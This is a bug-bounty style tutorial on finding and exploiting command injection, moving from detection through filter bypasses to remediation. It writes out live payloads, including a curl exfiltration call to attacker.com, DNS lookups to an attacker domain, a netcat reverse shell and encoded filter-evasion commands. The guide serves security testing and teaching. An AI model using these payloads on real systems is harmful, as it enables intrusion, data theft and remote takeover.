# Command Injections

[Relative Cheat Sheet](./cmd-injection-cheat.md)

## Step-by-Step Guide for Testing and Exploiting Command Injection Vulnerabilities

### 1. Understand Command Injection
   - **Explanation**: Command injection allows attackers to execute arbitrary OS commands via unsanitized user input concatenated into shell commands. This can lead to remote code execution (RCE), data exfiltration, or system compromise. It typically occurs in features like ping tools, file downloads, or system utilities where user input is passed to the shell.
   - **Why It's Done**: Understanding the vulnerability helps identify where commands might be executed, guiding targeted testing. It’s critical to know the OS (Linux/Windows) as commands differ.
   - **Example**: An app running `ping input` can be exploited with `input & whoami` to execute an additional command.

### 2. Identify Entry Points
   - **Explanation**: Find inputs that may feed into system commands, such as form fields (e.g., ping input), URL parameters, or API endpoints. Use a proxy like Burp Suite to map these inputs.
   - **Why It's Done**: These are potential injection points; mapping ensures no vulnerable endpoints are missed.
   - **Example**: A form field for entering an IP address to ping, like `ping <user_input>`.

### 3. Test with Basic Payloads
   - **Explanation**: Inject shell metacharacters (`;`, `|`, `&`, `||`, `$()`, etc.) followed by simple commands like `id` or `whoami`. Observe if the command’s output appears in the response.
   - **Why It's Done**: Confirms if the application executes user input as part of a shell command, indicating a vulnerability.
   - **Example**: Input `127.0.0.1; id` in a ping form to see if `uid=1000(user)` appears.

### 4. Detect Blind Injection
   - **Explanation**: If no output is returned, test for blind injection using time delays (e.g., `ping -c 10 127.0.0.1`) or out-of-band (OAST) techniques like DNS lookups (`nslookup attacker.com`).
   - **Why It's Done**: Blind injections don’t show output but can be confirmed via side effects like delays or external interactions.
   - **Example**: `127.0.0.1 & ping -c 10 127.0.0.1` causes a noticeable delay.

### 5. Bypass Filters and Blacklists
   - **Explanation**: If basic payloads fail, bypass filters using alternative syntax: `${IFS}` for spaces, case manipulation (`WhOaMi`), reversed commands (`rev<<<imaohw`), or encoded payloads (base64).
   - **Why It's Done**: Applications often filter common characters or commands; creative bypasses exploit weaknesses.
   - **Example**: Use `${IFS}` instead of space: `cat${IFS}/etc/passwd`.

### 6. Exfiltrate Data Blindly
   - **Explanation**: Use OAST to send command output via DNS or HTTP (e.g., `nslookup \`whoami\`.attacker.com`).
   - **Why It's Done**: Extracts data when direct output isn’t visible, increasing exploitability.
   - **Example**: `curl http://attacker.com/?data=`whoami`` sends the username to your server.

### 7. Escalate to Remote Code Execution
   - **Explanation**: Inject a reverse shell payload to gain interactive access (e.g., `nc -e /bin/sh attacker_ip port` on Linux or PowerShell equivalent on Windows).
   - **Why It's Done**: Turns injection into full system control, maximizing impact.
   - **Example**: `& nc -e /bin/sh 192.168.1.100 9001` connects back to your listener.

### 8. Test for Platform-Specific Bypasses
   - **Explanation**: Use Linux-specific (`$()` subshells, `${PATH:0:1}` for /) or Windows-specific (`^` for insertion, `%HOMEPATH:~0,-17%` for \).
   - **Why It's Done**: Commands and filters vary by OS; testing both ensures comprehensive coverage.
   - **Example**: Windows: `whoami^dir` to append dir command.

### 9. Use Evasion Tools
   - **Explanation**: Employ tools or scripts to automate obfuscation (e.g., custom base64 encoders or command generators).
   - **Why It's Done**: Simplifies bypassing complex filters or WAFs.
   - **Example**: Encode `whoami` in base64 and decode on target: `bash<<<$(base64 -d<<<d2hvYW1p)`.

### 10. Assess Prevention Measures
   - **Explanation**: Check if the application sanitizes input, uses safe APIs (e.g., `exec()` with escaped args), or restricts shell access.
   - **Why It's Done**: Informs remediation recommendations, like avoiding shell commands or whitelisting inputs.
   - **Example**: Secure apps use `exec(['ping', input])` instead of `system("ping $input")`.

This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, equips hunters to identify and exploit command injection vulnerabilities ethically. Always test within scope and report responsibly.